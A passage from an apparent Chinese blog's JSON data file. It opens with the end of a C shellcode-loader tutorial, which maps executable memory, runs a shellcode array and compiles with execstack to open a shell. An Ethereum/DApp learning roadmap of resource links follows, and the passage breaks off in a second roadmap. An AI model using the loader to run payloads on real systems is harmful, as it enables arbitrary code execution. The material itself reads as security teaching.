<span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span> &#123;<br>    <span class=\"hljs-comment\">// Print shellcode length</span><br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Shellcode Length: %ld\\n&quot;</span>, <span class=\"hljs-built_in\">strlen</span>(shellcode));<br><br>    <span class=\"hljs-comment\">// Allocate executable memory</span><br>    <span class=\"hljs-type\">void</span> *exec = mmap(<span class=\"hljs-number\">0</span>, <span class=\"hljs-keyword\">sizeof</span>(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class=\"hljs-number\">-1</span>, <span class=\"hljs-number\">0</span>);<br>    <span class=\"hljs-keyword\">if</span> (exec == MAP_FAILED) &#123;<br>        perror(<span class=\"hljs-string\">&quot;mmap&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>    &#125;<br><br>    <span class=\"hljs-comment\">// Copy shellcode to allocated memory</span><br>    <span class=\"hljs-built_in\">memcpy</span>(exec, shellcode, <span class=\"hljs-keyword\">sizeof</span>(shellcode));<br><br>    <span class=\"hljs-comment\">// Execute shellcode</span><br>    <span class=\"hljs-type\">void</span> (*execute_shellcode)() = (<span class=\"hljs-type\">void</span> (*)())exec;<br>    execute_shellcode();<br><br>    <span class=\"hljs-comment\">// Cleanup</span><br>    munmap(exec, <span class=\"hljs-keyword\">sizeof</span>(shellcode));<br><br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"编译\"><a href=\"#编译\" class=\"headerlink\" title=\"编译\"></a>编译</h3><p>使用 <code>-z execstack</code> 编译选项来允许执行堆栈上的代码:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">gcc -z execstack -o shellcode shellcode.c<br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"执行结果\"><a href=\"#执行结果\" class=\"headerlink\" title=\"执行结果\"></a>执行结果</h2><ul>\n<li>开启shell窗口。</li>\n</ul>\n"},{"title":"02-以太坊","date":"2024-08-01T16:01:58.000Z","_content":"# ETHer-developer-roadmap 2024\n\n以太坊 Dapp 开发学习路线\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 以太坊技术原理\n\n### 初级：\n\n1. 以太坊基本概念，Foundational topics 部分：[🔗](https://ethereum.org/en/developers/docs/)\n2. 利用 geth 搭建私有链并交互：\n3. 利用区块链浏览器 Etherscan 查看区块、交易、合约等信息：[🔗](http://etherscan.io/)\n4. 智能合约入门，solidity 官方文档 Basic 部分：[🔗](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html)\n5. 以太坊知识库：[🔗](https://learnblockchain.cn/eth/)\n6. 文章：分析 solidity 智能合约在EVM底层的存储架构，介绍不同的数据类型存储的地址槽和所占的大小 [🔗](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage)\n\n### 中级：\n\n1. 以太坊开发文档，Ethereum stack 部分：[🔗](https://ethereum.org/en/developers/docs/)\n2. 《精通以太坊》书籍\n    1. 英文版：[🔗](https://github.com/ethereumbook/ethereumbook)\n    2. 中文版：[🔗](https://github.com/inoutcode/ethereum_book)\n3. 以太坊白皮书（optional）：[🔗](https://ethereum.org/en/whitepaper/)\n\n### 高级\n\n1. **以太坊客户端**（建议 Geth）源码分模块阅读与分析：[🔗](https://geth.ethereum.org)\n2. **以太坊黄皮书（optional）**：[🔗](https://files.gitter.im/ethereum/yellowpaper/VIyt/Paper.pdf)\n3. Layer2、ETH2.0 技术方案阅读与分析：\n    1. [🔗](https://ethereum.org/en/developers/docs/scaling/)\n    2. [🔗](https://ethereum.org/en/developers/docs/scaling/layer-2-rollups/)\n4. 以太坊官网上（各路大佬们写）的**blog**：[🔗](https://blog.ethereum.org/archive/)\n\n### EVM\n\n1. 深潜 EVM 系列(EVM Deep Dives)文章：[🔗](https://substack.com/profile/80455042-noxx)\n    - EVM 的函数选择原理：[🔗](https://learnblockchain.cn/article/3647)\n    - EVM 中的内存数据区：[🔗](https://learnblockchain.cn/article/3684)\n2. ...\n\n## 智能合约开发\n\n### 初级\n\n1. 掌握“以太坊技术原理部分”初中级 75%以上内容\n2. 了解开发工具：2022 十大智能合约开发工具[🔗](https://learnblockchain.cn/article/3434)\n3. 以太坊开发教程（optional）：[🔗](https://ethereum-blockchain-developer.com/000-learn-ethereum/)\n4. \\*Cryptozombies ---玩游戏的方式学习 Solidity：[🔗](https://cryptozombies.io)\n\n### 中级\n\n#### 开发\n\n1. solidity 开发文档：[🔗](https://docs.soliditylang.org/en/latest/)\n2. Openzeppelin 文档（✨）：[🔗](https://docs.openzeppelin.com/contracts/4.x/)\n3. 一种前端 API：\n    1. web3.js: [🔗](https://web3js.readthedocs.io/en/v1.7.1/)\n    2. ethers.js: [🔗](https://docs.ethers.io/v5/)\n    3. 对比分析：[🔗](https://blog.infura.io/ethereum-javascript-libraries-web3-js-vs-ethers-js-part-i/)\n    4. ...\n4. 一种合约开发框架：\n    1. Truffle: [🔗](https://trufflesuite.com/)\n    2. Hardhat: [🔗](https://hardhat.org/)\n    3. Brownie: [🔗](https://eth-brownie.readthedocs.io/en/stable/)\n5. ...\n\n#### 安全\n\n1. 以太坊智能合约——最佳安全开发指南：[🔗](https://consensys.github.io/smart-contract-best-practices/)\n2. 智能合约攻击示例：[🔗](https://github.com/kadenzipfel/smart-contract-attack-vectors)\n3. BlockSec：[🔗](https://www.blocksecteam.com/)\n\n## 链上数据\n\n1. _The Graph ---链上数据获取：_[🔗](https://thegraph.com)\n2. _Chainlist ---EVM 网络列表：_[🔗](https://chainlist.org/)\n\n## 常用工具和网站\n\n### 工具：\n\n1. Solhint：一种静态检查器，提供安全和风格指南以及智能合约验证的最佳实践规则。\n2. [Dapptools](https://dapp.tools/)： 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。\n\n### 社区\n\n1. _登链社区 ---区块链开发者社区：_[🔗](https://learnblockchain.cn)\n2. Stack Overflow ---程序开发交流社区：[🔗](https://stackoverflow.com)\n3. Stack Exchange ---以太坊开发交流社区：[🔗](https://ethereum.stackexchange.com/)\n\n### 开源\n\n1. awesome-openzeppelin: [🔗](https://github.com/OpenZeppelin/awesome-openzeppelin)\n2. 区块链 Dapp 开发教程：[🔗](https://github.com/Dapp-Learning-DAO/Dapp-Learning)\n\n### 资料\n\n1. EIP/ERC：[🔗](https://dev.ethereum.cn/eips-1/)\n2. 以太坊维基百科：[🔗](https://eth.wiki/)\n3. layer2 方案的备忘录：[🔗](https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4)\n4. ethereum-input-data-decoder：[🔗](https://lab.miguelmota.com/ethereum-input-data-decoder/example/)\n5. evm 字节码：[🔗](https://www.evm.codes/)\n6. 加密协议列表：[🔗](https://github.com/bryanhpchiang/protocol-reading-list)\n","source":"_posts/BlockChain/Road/02-以太坊.md","raw":"---\ntitle: 02-以太坊\ndate: 2024-08-02 00:01:58\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# ETHer-developer-roadmap 2024\n\n以太坊 Dapp 开发学习路线\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 以太坊技术原理\n\n### 初级：\n\n1. 以太坊基本概念，Foundational topics 部分：[🔗](https://ethereum.org/en/developers/docs/)\n2. 利用 geth 搭建私有链并交互：\n3. 利用区块链浏览器 Etherscan 查看区块、交易、合约等信息：[🔗](http://etherscan.io/)\n4. 智能合约入门，solidity 官方文档 Basic 部分：[🔗](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html)\n5. 以太坊知识库：[🔗](https://learnblockchain.cn/eth/)\n6. 文章：分析 solidity 智能合约在EVM底层的存储架构，介绍不同的数据类型存储的地址槽和所占的大小 [🔗](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage)\n\n### 中级：\n\n1. 以太坊开发文档，Ethereum stack 部分：[🔗](https://ethereum.org/en/developers/docs/)\n2. 《精通以太坊》书籍\n    1. 英文版：[🔗](https://github.com/ethereumbook/ethereumbook)\n    2. 中文版：[🔗](https://github.com/inoutcode/ethereum_book)\n3. 以太坊白皮书（optional）：[🔗](https://ethereum.org/en/whitepaper/)\n\n### 高级\n\n1. **以太坊客户端**（建议 Geth）源码分模块阅读与分析：[🔗](https://geth.ethereum.org)\n2. **以太坊黄皮书（optional）**：[🔗](https://files.gitter.im/ethereum/yellowpaper/VIyt/Paper.pdf)\n3. Layer2、ETH2.0 技术方案阅读与分析：\n    1. [🔗](https://ethereum.org/en/developers/docs/scaling/)\n    2. [🔗](https://ethereum.org/en/developers/docs/scaling/layer-2-rollups/)\n4. 以太坊官网上（各路大佬们写）的**blog**：[🔗](https://blog.ethereum.org/archive/)\n\n### EVM\n\n1. 深潜 EVM 系列(EVM Deep Dives)文章：[🔗](https://substack.com/profile/80455042-noxx)\n    - EVM 的函数选择原理：[🔗](https://learnblockchain.cn/article/3647)\n    - EVM 中的内存数据区：[🔗](https://learnblockchain.cn/article/3684)\n2. ...\n\n## 智能合约开发\n\n### 初级\n\n1. 掌握“以太坊技术原理部分”初中级 75%以上内容\n2. 了解开发工具：2022 十大智能合约开发工具[🔗](https://learnblockchain.cn/article/3434)\n3. 以太坊开发教程（optional）：[🔗](https://ethereum-blockchain-developer.com/000-learn-ethereum/)\n4. \\*Cryptozombies ---玩游戏的方式学习 Solidity：[🔗](https://cryptozombies.io)\n\n### 中级\n\n#### 开发\n\n1. solidity 开发文档：[🔗](https://docs.soliditylang.org/en/latest/)\n2. Openzeppelin 文档（✨）：[🔗](https://docs.openzeppelin.com/contracts/4.x/)\n3. 一种前端 API：\n    1. web3.js: [🔗](https://web3js.readthedocs.io/en/v1.7.1/)\n    2. ethers.js: [🔗](https://docs.ethers.io/v5/)\n    3. 对比分析：[🔗](https://blog.infura.io/ethereum-javascript-libraries-web3-js-vs-ethers-js-part-i/)\n    4. ...\n4. 一种合约开发框架：\n    1. Truffle: [🔗](https://trufflesuite.com/)\n    2. Hardhat: [🔗](https://hardhat.org/)\n    3. Brownie: [🔗](https://eth-brownie.readthedocs.io/en/stable/)\n5. ...\n\n#### 安全\n\n1. 以太坊智能合约——最佳安全开发指南：[🔗](https://consensys.github.io/smart-contract-best-practices/)\n2. 智能合约攻击示例：[🔗](https://github.com/kadenzipfel/smart-contract-attack-vectors)\n3. BlockSec：[🔗](https://www.blocksecteam.com/)\n\n## 链上数据\n\n1. _The Graph ---链上数据获取：_[🔗](https://thegraph.com)\n2. _Chainlist ---EVM 网络列表：_[🔗](https://chainlist.org/)\n\n## 常用工具和网站\n\n### 工具：\n\n1. Solhint：一种静态检查器，提供安全和风格指南以及智能合约验证的最佳实践规则。\n2. [Dapptools](https://dapp.tools/)： 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。\n\n### 社区\n\n1. _登链社区 ---区块链开发者社区：_[🔗](https://learnblockchain.cn)\n2. Stack Overflow ---程序开发交流社区：[🔗](https://stackoverflow.com)\n3. Stack Exchange ---以太坊开发交流社区：[🔗](https://ethereum.stackexchange.com/)\n\n### 开源\n\n1. awesome-openzeppelin: [🔗](https://github.com/OpenZeppelin/awesome-openzeppelin)\n2. 区块链 Dapp 开发教程：[🔗](https://github.com/Dapp-Learning-DAO/Dapp-Learning)\n\n### 资料\n\n1. EIP/ERC：[🔗](https://dev.ethereum.cn/eips-1/)\n2. 以太坊维基百科：[🔗](https://eth.wiki/)\n3. layer2 方案的备忘录：[🔗](https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4)\n4. ethereum-input-data-decoder：[🔗](https://lab.miguelmota.com/ethereum-input-data-decoder/example/)\n5. evm 字节码：[🔗](https://www.evm.codes/)\n6. 加密协议列表：[🔗](https://github.com/bryanhpchiang/protocol-reading-list)\n","slug":"BlockChain/Road/02-以太坊","published":1,"updated":"2024-08-01T16:11:17.821Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821c00012sun8lhg3dra","content":"<h1 id=\"ETHer-developer-roadmap-2024\"><a href=\"#ETHer-developer-roadmap-2024\" class=\"headerlink\" title=\"ETHer-developer-roadmap 2024\"></a>ETHer-developer-roadmap 2024</h1><p>以太坊 Dapp 开发学习路线</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"以太坊技术原理\"><a href=\"#以太坊技术原理\" class=\"headerlink\" title=\"以太坊技术原理\"></a>以太坊技术原理</h2><h3 id=\"初级：\"><a href=\"#初级：\" class=\"headerlink\" title=\"初级：\"></a>初级：</h3><ol>\n<li>以太坊基本概念，Foundational topics 部分：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>利用 geth 搭建私有链并交互：</li>\n<li>利用区块链浏览器 Etherscan 查看区块、交易、合约等信息：<a href=\"http://etherscan.io/\">🔗</a></li>\n<li>智能合约入门，solidity 官方文档 Basic 部分：<a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html\">🔗</a></li>\n<li>以太坊知识库：<a href=\"https://learnblockchain.cn/eth/\">🔗</a></li>\n<li>文章：分析 solidity 智能合约在EVM底层的存储架构，介绍不同的数据类型存储的地址槽和所占的大小 <a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage\">🔗</a></li>\n</ol>\n<h3 id=\"中级：\"><a href=\"#中级：\" class=\"headerlink\" title=\"中级：\"></a>中级：</h3><ol>\n<li>以太坊开发文档，Ethereum stack 部分：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>《精通以太坊》书籍<ol>\n<li>英文版：<a href=\"https://github.com/ethereumbook/ethereumbook\">🔗</a></li>\n<li>中文版：<a href=\"https://github.com/inoutcode/ethereum_book\">🔗</a></li>\n</ol>\n</li>\n<li>以太坊白皮书（optional）：<a href=\"https://ethereum.org/en/whitepaper/\">🔗</a></li>\n</ol>\n<h3 id=\"高级\"><a href=\"#高级\" class=\"headerlink\" title=\"高级\"></a>高级</h3><ol>\n<li><strong>以太坊客户端</strong>（建议 Geth）源码分模块阅读与分析：<a href=\"https://geth.ethereum.org/\">🔗</a></li>\n<li><strong>以太坊黄皮书（optional）</strong>：<a href=\"https://files.gitter.im/ethereum/yellowpaper/VIyt/Paper.pdf\">🔗</a></li>\n<li>Layer2、ETH2.0 技术方案阅读与分析：<ol>\n<li><a href=\"https://ethereum.org/en/developers/docs/scaling/\">🔗</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/scaling/layer-2-rollups/\">🔗</a></li>\n</ol>\n</li>\n<li>以太坊官网上（各路大佬们写）的<strong>blog</strong>：<a href=\"https://blog.ethereum.org/archive/\">🔗</a></li>\n</ol>\n<h3 id=\"EVM\"><a href=\"#EVM\" class=\"headerlink\" title=\"EVM\"></a>EVM</h3><ol>\n<li>深潜 EVM 系列(EVM Deep Dives)文章：<a href=\"https://substack.com/profile/80455042-noxx\">🔗</a><ul>\n<li>EVM 的函数选择原理：<a href=\"https://learnblockchain.cn/article/3647\">🔗</a></li>\n<li>EVM 中的内存数据区：<a href=\"https://learnblockchain.cn/article/3684\">🔗</a></li>\n</ul>\n</li>\n<li>…</li>\n</ol>\n<h2 id=\"智能合约开发\"><a href=\"#智能合约开发\" class=\"headerlink\" title=\"智能合约开发\"></a>智能合约开发</h2><h3 id=\"初级\"><a href=\"#初级\" class=\"headerlink\" title=\"初级\"></a>初级</h3><ol>\n<li>掌握“以太坊技术原理部分”初中级 75%以上内容</li>\n<li>了解开发工具：2022 十大智能合约开发工具<a href=\"https://learnblockchain.cn/article/3434\">🔗</a></li>\n<li>以太坊开发教程（optional）：<a href=\"https://ethereum-blockchain-developer.com/000-learn-ethereum/\">🔗</a></li>\n<li>*Cryptozombies —玩游戏的方式学习 Solidity：<a href=\"https://cryptozombies.io/\">🔗</a></li>\n</ol>\n<h3 id=\"中级\"><a href=\"#中级\" class=\"headerlink\" title=\"中级\"></a>中级</h3><h4 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h4><ol>\n<li>solidity 开发文档：<a href=\"https://docs.soliditylang.org/en/latest/\">🔗</a></li>\n<li>Openzeppelin 文档（✨）：<a href=\"https://docs.openzeppelin.com/contracts/4.x/\">🔗</a></li>\n<li>一种前端 API：<ol>\n<li>web3.js: <a href=\"https://web3js.readthedocs.io/en/v1.7.1/\">🔗</a></li>\n<li>ethers.js: <a href=\"https://docs.ethers.io/v5/\">🔗</a></li>\n<li>对比分析：<a href=\"https://blog.infura.io/ethereum-javascript-libraries-web3-js-vs-ethers-js-part-i/\">🔗</a></li>\n<li>…</li>\n</ol>\n</li>\n<li>一种合约开发框架：<ol>\n<li>Truffle: <a href=\"https://trufflesuite.com/\">🔗</a></li>\n<li>Hardhat: <a href=\"https://hardhat.org/\">🔗</a></li>\n<li>Brownie: <a href=\"https://eth-brownie.readthedocs.io/en/stable/\">🔗</a></li>\n</ol>\n</li>\n<li>…</li>\n</ol>\n<h4 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h4><ol>\n<li>以太坊智能合约——最佳安全开发指南：<a href=\"https://consensys.github.io/smart-contract-best-practices/\">🔗</a></li>\n<li>智能合约攻击示例：<a href=\"https://github.com/kadenzipfel/smart-contract-attack-vectors\">🔗</a></li>\n<li>BlockSec：<a href=\"https://www.blocksecteam.com/\">🔗</a></li>\n</ol>\n<h2 id=\"链上数据\"><a href=\"#链上数据\" class=\"headerlink\" title=\"链上数据\"></a>链上数据</h2><ol>\n<li><em>The Graph —链上数据获取：</em><a href=\"https://thegraph.com/\">🔗</a></li>\n<li><em>Chainlist —EVM 网络列表：</em><a href=\"https://chainlist.org/\">🔗</a></li>\n</ol>\n<h2 id=\"常用工具和网站\"><a href=\"#常用工具和网站\" class=\"headerlink\" title=\"常用工具和网站\"></a>常用工具和网站</h2><h3 id=\"工具：\"><a href=\"#工具：\" class=\"headerlink\" title=\"工具：\"></a>工具：</h3><ol>\n<li>Solhint：一种静态检查器，提供安全和风格指南以及智能合约验证的最佳实践规则。</li>\n<li><a href=\"https://dapp.tools/\">Dapptools</a>： 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。</li>\n</ol>\n<h3 id=\"社区\"><a href=\"#社区\" class=\"headerlink\" title=\"社区\"></a>社区</h3><ol>\n<li><em>登链社区 —区块链开发者社区：</em><a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>Stack Overflow —程序开发交流社区：<a href=\"https://stackoverflow.com/\">🔗</a></li>\n<li>Stack Exchange —以太坊开发交流社区：<a href=\"https://ethereum.stackexchange.com/\">🔗</a></li>\n</ol>\n<h3 id=\"开源\"><a href=\"#开源\" class=\"headerlink\" title=\"开源\"></a>开源</h3><ol>\n<li>awesome-openzeppelin: <a href=\"https://github.com/OpenZeppelin/awesome-openzeppelin\">🔗</a></li>\n<li>区块链 Dapp 开发教程：<a href=\"https://github.com/Dapp-Learning-DAO/Dapp-Learning\">🔗</a></li>\n</ol>\n<h3 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h3><ol>\n<li>EIP&#x2F;ERC：<a href=\"https://dev.ethereum.cn/eips-1/\">🔗</a></li>\n<li>以太坊维基百科：<a href=\"https://eth.wiki/\">🔗</a></li>\n<li>layer2 方案的备忘录：<a href=\"https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4\">🔗</a></li>\n<li>ethereum-input-data-decoder：<a href=\"https://lab.miguelmota.com/ethereum-input-data-decoder/example/\">🔗</a></li>\n<li>evm 字节码：<a href=\"https://www.evm.codes/\">🔗</a></li>\n<li>加密协议列表：<a href=\"https://github.com/bryanhpchiang/protocol-reading-list\">🔗</a></li>\n</ol>\n","excerpt":"","more":"<h1 id=\"ETHer-developer-roadmap-2024\"><a href=\"#ETHer-developer-roadmap-2024\" class=\"headerlink\" title=\"ETHer-developer-roadmap 2024\"></a>ETHer-developer-roadmap 2024</h1><p>以太坊 Dapp 开发学习路线</p>\n<p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p>\n<h2 id=\"以太坊技术原理\"><a href=\"#以太坊技术原理\" class=\"headerlink\" title=\"以太坊技术原理\"></a>以太坊技术原理</h2><h3 id=\"初级：\"><a href=\"#初级：\" class=\"headerlink\" title=\"初级：\"></a>初级：</h3><ol>\n<li>以太坊基本概念，Foundational topics 部分：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>利用 geth 搭建私有链并交互：</li>\n<li>利用区块链浏览器 Etherscan 查看区块、交易、合约等信息：<a href=\"http://etherscan.io/\">🔗</a></li>\n<li>智能合约入门，solidity 官方文档 Basic 部分：<a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html\">🔗</a></li>\n<li>以太坊知识库：<a href=\"https://learnblockchain.cn/eth/\">🔗</a></li>\n<li>文章：分析 solidity 智能合约在EVM底层的存储架构，介绍不同的数据类型存储的地址槽和所占的大小 <a href=\"https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage\">🔗</a></li>\n</ol>\n<h3 id=\"中级：\"><a href=\"#中级：\" class=\"headerlink\" title=\"中级：\"></a>中级：</h3><ol>\n<li>以太坊开发文档，Ethereum stack 部分：<a href=\"https://ethereum.org/en/developers/docs/\">🔗</a></li>\n<li>《精通以太坊》书籍<ol>\n<li>英文版：<a href=\"https://github.com/ethereumbook/ethereumbook\">🔗</a></li>\n<li>中文版：<a href=\"https://github.com/inoutcode/ethereum_book\">🔗</a></li>\n</ol>\n</li>\n<li>以太坊白皮书（optional）：<a href=\"https://ethereum.org/en/whitepaper/\">🔗</a></li>\n</ol>\n<h3 id=\"高级\"><a href=\"#高级\" class=\"headerlink\" title=\"高级\"></a>高级</h3><ol>\n<li><strong>以太坊客户端</strong>（建议 Geth）源码分模块阅读与分析：<a href=\"https://geth.ethereum.org/\">🔗</a></li>\n<li><strong>以太坊黄皮书（optional）</strong>：<a href=\"https://files.gitter.im/ethereum/yellowpaper/VIyt/Paper.pdf\">🔗</a></li>\n<li>Layer2、ETH2.0 技术方案阅读与分析：<ol>\n<li><a href=\"https://ethereum.org/en/developers/docs/scaling/\">🔗</a></li>\n<li><a href=\"https://ethereum.org/en/developers/docs/scaling/layer-2-rollups/\">🔗</a></li>\n</ol>\n</li>\n<li>以太坊官网上（各路大佬们写）的<strong>blog</strong>：<a href=\"https://blog.ethereum.org/archive/\">🔗</a></li>\n</ol>\n<h3 id=\"EVM\"><a href=\"#EVM\" class=\"headerlink\" title=\"EVM\"></a>EVM</h3><ol>\n<li>深潜 EVM 系列(EVM Deep Dives)文章：<a href=\"https://substack.com/profile/80455042-noxx\">🔗</a><ul>\n<li>EVM 的函数选择原理：<a href=\"https://learnblockchain.cn/article/3647\">🔗</a></li>\n<li>EVM 中的内存数据区：<a href=\"https://learnblockchain.cn/article/3684\">🔗</a></li>\n</ul>\n</li>\n<li>…</li>\n</ol>\n<h2 id=\"智能合约开发\"><a href=\"#智能合约开发\" class=\"headerlink\" title=\"智能合约开发\"></a>智能合约开发</h2><h3 id=\"初级\"><a href=\"#初级\" class=\"headerlink\" title=\"初级\"></a>初级</h3><ol>\n<li>掌握“以太坊技术原理部分”初中级 75%以上内容</li>\n<li>了解开发工具：2022 十大智能合约开发工具<a href=\"https://learnblockchain.cn/article/3434\">🔗</a></li>\n<li>以太坊开发教程（optional）：<a href=\"https://ethereum-blockchain-developer.com/000-learn-ethereum/\">🔗</a></li>\n<li>*Cryptozombies —玩游戏的方式学习 Solidity：<a href=\"https://cryptozombies.io/\">🔗</a></li>\n</ol>\n<h3 id=\"中级\"><a href=\"#中级\" class=\"headerlink\" title=\"中级\"></a>中级</h3><h4 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h4><ol>\n<li>solidity 开发文档：<a href=\"https://docs.soliditylang.org/en/latest/\">🔗</a></li>\n<li>Openzeppelin 文档（✨）：<a href=\"https://docs.openzeppelin.com/contracts/4.x/\">🔗</a></li>\n<li>一种前端 API：<ol>\n<li>web3.js: <a href=\"https://web3js.readthedocs.io/en/v1.7.1/\">🔗</a></li>\n<li>ethers.js: <a href=\"https://docs.ethers.io/v5/\">🔗</a></li>\n<li>对比分析：<a href=\"https://blog.infura.io/ethereum-javascript-libraries-web3-js-vs-ethers-js-part-i/\">🔗</a></li>\n<li>…</li>\n</ol>\n</li>\n<li>一种合约开发框架：<ol>\n<li>Truffle: <a href=\"https://trufflesuite.com/\">🔗</a></li>\n<li>Hardhat: <a href=\"https://hardhat.org/\">🔗</a></li>\n<li>Brownie: <a href=\"https://eth-brownie.readthedocs.io/en/stable/\">🔗</a></li>\n</ol>\n</li>\n<li>…</li>\n</ol>\n<h4 id=\"安全\"><a href=\"#安全\" class=\"headerlink\" title=\"安全\"></a>安全</h4><ol>\n<li>以太坊智能合约——最佳安全开发指南：<a href=\"https://consensys.github.io/smart-contract-best-practices/\">🔗</a></li>\n<li>智能合约攻击示例：<a href=\"https://github.com/kadenzipfel/smart-contract-attack-vectors\">🔗</a></li>\n<li>BlockSec：<a href=\"https://www.blocksecteam.com/\">🔗</a></li>\n</ol>\n<h2 id=\"链上数据\"><a href=\"#链上数据\" class=\"headerlink\" title=\"链上数据\"></a>链上数据</h2><ol>\n<li><em>The Graph —链上数据获取：</em><a href=\"https://thegraph.com/\">🔗</a></li>\n<li><em>Chainlist —EVM 网络列表：</em><a href=\"https://chainlist.org/\">🔗</a></li>\n</ol>\n<h2 id=\"常用工具和网站\"><a href=\"#常用工具和网站\" class=\"headerlink\" title=\"常用工具和网站\"></a>常用工具和网站</h2><h3 id=\"工具：\"><a href=\"#工具：\" class=\"headerlink\" title=\"工具：\"></a>工具：</h3><ol>\n<li>Solhint：一种静态检查器，提供安全和风格指南以及智能合约验证的最佳实践规则。</li>\n<li><a href=\"https://dapp.tools/\">Dapptools</a>： 一套专注于以太坊的 CLI 工具，遵循 Unix 设计理念，倾向于可组合、可配置和可扩展性。</li>\n</ol>\n<h3 id=\"社区\"><a href=\"#社区\" class=\"headerlink\" title=\"社区\"></a>社区</h3><ol>\n<li><em>登链社区 —区块链开发者社区：</em><a href=\"https://learnblockchain.cn/\">🔗</a></li>\n<li>Stack Overflow —程序开发交流社区：<a href=\"https://stackoverflow.com/\">🔗</a></li>\n<li>Stack Exchange —以太坊开发交流社区：<a href=\"https://ethereum.stackexchange.com/\">🔗</a></li>\n</ol>\n<h3 id=\"开源\"><a href=\"#开源\" class=\"headerlink\" title=\"开源\"></a>开源</h3><ol>\n<li>awesome-openzeppelin: <a href=\"https://github.com/OpenZeppelin/awesome-openzeppelin\">🔗</a></li>\n<li>区块链 Dapp 开发教程：<a href=\"https://github.com/Dapp-Learning-DAO/Dapp-Learning\">🔗</a></li>\n</ol>\n<h3 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h3><ol>\n<li>EIP&#x2F;ERC：<a href=\"https://dev.ethereum.cn/eips-1/\">🔗</a></li>\n<li>以太坊维基百科：<a href=\"https://eth.wiki/\">🔗</a></li>\n<li>layer2 方案的备忘录：<a href=\"https://mirror.xyz/ethmaxitard.eth/iyCAlOexgQKOvoSAAk4utYGEdnESOKb5HstM2_LaqL4\">🔗</a></li>\n<li>ethereum-input-data-decoder：<a href=\"https://lab.miguelmota.com/ethereum-input-data-decoder/example/\">🔗</a></li>\n<li>evm 字节码：<a href=\"https://www.evm.codes/\">🔗</a></li>\n<li>加密协议列表：<a href=\"https://github.com/bryanhpchiang/protocol-reading-list\">🔗</a></li>\n</ol>\n"},{"title":"01-区块链基本路线","date":"2024-08-01T16:00:46.000Z","_content":"# blockchainer-roadmap 2024\n\n区块链者学习路线 2024🚀🚀🚀🚀\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n在总结过往学习资料、路线的基础上，结合最新的区块链前沿技术，制定了本学习路线 🎨。\n\n## 第一层\n\n区块链入门\n\n-   **纪录片**\n    -   《区块链之新》6 集，小小名人录 [🔗](https://www.bilibili.com/bangumi/play/ep290332?from=search&seid=4820733908948631673)\n-   **网课**\n    -   区块链技术与应用，北大肖臻老师出品，内容极佳 [🔗](https://www.bilibili.com/video/av37065233) 笔记 [🔗](https://github.com/CSWellesSun/CSNotes/blob/main/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/Note/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8.md)\n    -   WTF Academy，开发者的 Web3 开源大学 [🔗](https://www.wtf.academy/)\n    -   DeFi 去中心化金融，UCB 课程 [🔗](https://www.bilibili.com/video/BV1iV4y1T7iL/)\n    -   DAPP 开发入门，新手友好 [🔗](https://guoyu.mirror.xyz/RD-xkpoxasAU7x5MIJmiCX4gll3Cs0pAd5iM258S1Ek)\n    -   Crypto Zombie，通过完成一个小游戏来学习 DAPP 开发 [🔗](https://cryptozombies.io/)\n    -   Solidity 入门，以太坊开发 [🔗](https://blog.chain.link/learn-blockchain-full-stack-web3-javascript-smart-contract-development-zh/)\n    -  